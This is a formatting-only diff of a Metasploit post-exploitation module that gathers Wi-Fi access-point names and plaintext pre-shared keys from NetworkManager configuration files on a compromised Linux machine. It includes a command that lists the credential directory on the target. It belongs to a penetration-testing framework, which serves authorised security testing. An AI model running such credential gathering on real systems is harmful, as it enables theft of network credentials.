@@ -10,27 +10,32 @@ class MetasploitModule < Msf::Post
 
   include Msf::Auxiliary::Report
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'          => 'Linux Gather 802-11-Wireless-Security Credentials',
-      'Description'   => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Linux Gather 802-11-Wireless-Security Credentials',
+        'Description' => %q{
           This module collects 802-11-Wireless-Security credentials such as
           Access-Point name and Pre-Shared-Key from your target CLIENT Linux
           machine using /etc/NetworkManager/system-connections/ files.
           The module gathers NetworkManager's plaintext "psk" information.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => ['Cenk Kalpakoglu'],
-      'Platform'      => ['linux'],
-      'SessionTypes'  => ['shell', 'meterpreter']
-    ))
+        },
+        'License' => MSF_LICENSE,
+        'Author' => ['Cenk Kalpakoglu'],
+        'Platform' => ['linux'],
+        'SessionTypes' => ['shell', 'meterpreter']
+      )
+    )
 
     register_options(
       [
-        OptString.new('DIR', [true, 'The default path for network connections',
-                              '/etc/NetworkManager/system-connections/']
-        )
-      ])
+        OptString.new('DIR', [
+          true, 'The default path for network connections',
+          '/etc/NetworkManager/system-connections/'
+        ])
+      ]
+    )
   end
 
   def dir
@@ -50,9 +55,9 @@ class MetasploitModule < Msf::Post
 
   def extract_all_creds
     tbl = Rex::Text::Table.new({
-      'Header'  => '802-11-wireless-security',
+      'Header' => '802-11-wireless-security',
       'Columns' => ['AccessPoint-Name', 'PSK'],
-      'Indent'  => 1,
+      'Indent' => 1,
     })
     files = cmd_exec("/bin/ls -1 #{dir}").chomp.split("\n")
     files.each do |f|
